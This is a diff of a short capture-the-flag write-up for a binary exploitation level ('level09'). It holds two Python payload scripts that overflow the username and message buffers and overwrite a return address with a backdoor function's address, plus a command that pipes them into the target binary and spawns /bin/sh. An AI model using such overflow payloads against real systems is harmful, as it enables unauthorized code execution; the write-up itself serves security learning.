@@ -1,17 +1,23 @@
-possible exploit 
-overwrite the return address of handle_msg function
+* in this challenge the program asks for a username and msg , than display "msg sent".
+* looking at the assembly with gdb :
 
 
 
+
+
+***************** username ************************
 import struct
 
 padding = "A" * 40
 
-talaob = struct.pack ("B", 0xd0)
+msg_len = struct.pack ("B", 0xd0)
 
-print padding + talaob
+print padding + msg_len
+
+****************************************************
 
 
+***************** msg ******************************
 import struct
 
 padding = "A" * 200
@@ -19,3 +25,10 @@ padding = "A" * 200
 backdoor = struct.pack ("Q", 0x55555555488c)
 
 print padding + backdoor
+****************************************************
+
+
+python /var/tmp/username.py > username
+python /var/tmp/msg.py > msg
+---> where the scripts above are the content of username.py , msg.py respectivly.
+(cat username; sleep 1; cat msg; sleep 1; echo "/bin/sh"; cat ) | /home/users/level09/level09
